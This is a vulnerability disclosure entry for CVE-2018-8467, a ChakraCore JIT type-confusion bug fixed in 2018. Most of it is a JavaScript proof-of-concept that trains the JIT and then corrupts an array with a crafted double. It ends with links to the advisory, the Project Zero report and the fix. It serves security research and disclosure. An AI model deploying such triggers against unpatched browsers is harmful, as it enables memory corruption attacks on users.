# CVE-2018-8467

- Fix: Sep 2018
- Credit: lokihardt of Google Project Zero

## PoC

```javascript
function opt(arr, arr2) {
    arr[0] = 1.1;

    arr2.method(arr2[0] = {});

    arr[0] = 2.3023e-320;
}

Object.prototype.method = () => {};

let arr = [1.1, 2.2];
for (let i = 0; i < 100; i++) {
    opt(arr, 1);  // Feeding an integer to make the value type LikelyCanBeTaggedValue_Int_PrimitiveOrObject
    opt(arr, arr.concat());
}

setTimeout(() => {
    opt(arr, arr);
    alert(arr);
}, 100);  // Waiting for the JIT server to finish its job.
```

## Reference

- [Microsoft](https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2018-8467)
- [Google Project Zero](https://bugs.chromium.org/p/project-zero/issues/detail?id=1613)
- [Fix](https://github.com/Microsoft/ChakraCore/commit/07a72e2849aab95ccdc178afbdab442cfee75368)
